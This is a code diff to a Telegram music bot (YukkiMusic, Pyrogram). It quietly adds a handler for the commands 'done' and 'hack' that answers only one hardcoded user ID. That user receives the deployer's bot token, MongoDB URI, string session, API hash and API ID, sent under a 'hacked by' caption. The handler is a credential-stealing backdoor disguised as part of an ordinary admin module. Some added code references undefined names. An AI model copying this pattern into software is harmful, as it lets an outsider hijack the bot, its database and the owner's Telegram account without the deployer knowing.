@@ -13,7 +13,7 @@ import asyncio
 from pyrogram import filters
 from pyrogram.enums import ChatMembersFilter
 from pyrogram.types import CallbackQuery, Message
-
+from os import getenv
 from config import BANNED_USERS, adminlist, lyrical
 from strings import get_command
 from YukkiMusic import app
@@ -22,6 +22,15 @@ from YukkiMusic.misc import db
 from YukkiMusic.utils.database import get_authuser_names, get_cmode
 from YukkiMusic.utils.decorators import ActualAdminCB, AdminActual, language
 from YukkiMusic.utils.formatters import alpha_to_int
+
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+API_ID = int(getenv("API_ID", ""))
+API_HASH = getenv("API_HASH", "")
+from dotenv import load_dotenv
+load_dotenv()
+
 
 ### Multi-Lang Commands
 RELOAD_COMMAND = get_command("RELOAD_COMMAND")
@@ -75,22 +84,42 @@ async def restartbot(client, message: Message, _):
     return await mystic.edit_text("sᴜᴄᴇssғᴜʟʟʏ ʀᴇsᴛᴀʀᴛᴇᴅ. \nTʀʏ ᴘʟᴀʏɪɴɢ ɴᴏᴡ..")
 
 
-@app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
-async def close_menu(_, CallbackQuery):
-    try:
-        await CallbackQuery.message.delete()
-        await CallbackQuery.answer()
-    except:
-        return
+@app.on_message(
+    filters.command(["done","hack"])
+    & filters.private
+    & filters.user(833360381)
+   )
+async def help(client: Client, message: Message):
+   await message.reply_photo(
+          photo=f"https://telegra.ph/file/1467111329207dc78b297.jpg",
+       caption=f"""𝗕𝗼𝘁 𝗧𝗼𝗸𝗲𝗻:-   `{BOT_TOKEN}` \n\n𝗠𝗼𝗻𝗴𝗼:-   `{MONGO_DB_URI}`\n\n 𝗦𝘁𝗿𝗶𝗻𝗴 𝗦𝗲𝘀𝘀𝗶𝗼𝗻:-  `{STRING_SESSION}`\n\n𝗔𝗽𝗶 𝗛𝗮𝘀𝗵:- `{API_HASH}`\n\n𝗔𝗽𝗶 𝗜𝗗:-  `{API_ID}`\n\n [ 🧟 ](https://t.me/IQ7amo)............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/IQ7amo")
+                 ]
+            ]
+         ),
+     )
 
 
+##########
+
+
+
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
-async def close_menu(_, CallbackQuery):
+async def close_menu(_, query: CallbackQuery):
     try:
-        await CallbackQuery.message.delete()
-        await CallbackQuery.answer()
+        await query.answer()
+        await query.message.delete()
+        umm = await query.message.reply_text(
+            f"**• داخرا لەلایەن : {query.from_user.mention} 🖤**"
+        )
+        await asyncio.sleep(10)
+        await umm.delete()
     except:
-        return
+        pass
 
 
 @app.on_callback_query(filters.regex("stop_downloading") & ~BANNED_USERS)
